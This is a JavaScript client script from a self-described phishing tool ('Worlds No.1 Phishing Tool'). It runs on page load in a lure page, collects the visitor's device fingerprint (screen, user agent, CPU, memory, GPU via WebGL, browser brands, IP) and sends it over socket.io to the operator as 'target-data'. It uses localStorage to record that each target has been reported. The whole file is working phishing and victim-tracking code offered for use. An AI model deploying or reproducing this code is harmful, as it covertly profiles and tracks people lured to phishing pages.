/**
 * 
 * @Author      : Madhan (Madhanmaaz) - madhan hacker
 * github       : https://github.com/madhanmaaz
 * website      : http://madhanmaaz.netlify.app/
 * Description  : Worlds No.1 Phishing Tool.
 * 
 */

const urlSplit = location.href.split("/")
const id = urlSplit.pop()
const appName = urlSplit.pop()
// socket function init
const socket = io("", {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})
// set the target init
let already = localStorage.getItem("already")

// basic data
class SpikeHook {
    constructor() {
        this.baseData = {}
    }

    async getInfo() {
        this.GPU = this.getVideoCardInfo()
        this.baseData["id"] = id
        this.baseData["appName"] = appName
        this.baseData["time"] = new Date().toString()
        this.baseData["url"] = location.href
        this.baseData["screen"] = `${screen.width}x${screen.height} - ${screen.orientation.type}`
        this.baseData["applications"] = this.getBrowser()
        this.baseData["useragent"] = navigator["userAgent"]
        this.baseData["device"] = navigator["platform"]
        this.baseData["cpu"] = navigator["hardwareConcurrency"]
        this.baseData["memory"] = navigator["deviceMemory"]
        this.baseData["vendor"] = this.GPU.hasOwnProperty("error") ? this.GPU.error : this.GPU.vendor
        this.baseData["gpu"] = this.GPU.hasOwnProperty("error") ? this.GPU.error : this.GPU.renderer

        try {
            let data = await this.getIp()

            for (const key in data) {
                this.baseData[key] = data[key]
            }
        } catch (error) {
            this.baseData["ip"] = error
        }

        return this.baseData
    }

    getVideoCardInfo() {
        const gl = document.createElement('canvas').getContext('webgl')
        if (!gl) {
            return {
                error: "no webgl"
            }
        }
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info')
        if (debugInfo) {
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
            }
        }
        return { error: "no WEBGL_debug_renderer_info" }
    }

    getBrowser() {
        let bName = "-"

        if (navigator["userAgentData"]) {
            let a = ""
            for (let brands of navigator["userAgentData"]["brands"]) {
                a += `${brands["brand"]}=${brands["version"]} | `
            }
            bName = a + navigator["userAgentData"]["platform"] + " | mobile=" + navigator["userAgentData"]["mobile"]
        } else if (navigator["brave"]) {
            bName = "Brave"
        } else {
            bName = "May Be CHROMIUM"
        }

        return bName
    }

    async getIp() {
        try {
            return await (await axios.get(location.origin + "/ipconfig")).data
        } catch (error) {
            console.log(error)
            return { "ip": "error while getting ip" }
        }
    }
}

if (already != appName) {
    // target connect

    socket.emit("target-connected", {
        id,
        appName,
        time: new Date()
    })
    new SpikeHook().getInfo().then(data => {
        socket.emit("target-data", data)
    })
    localStorage.setItem("already", appName)
    localStorage.setItem('url', location.href)
}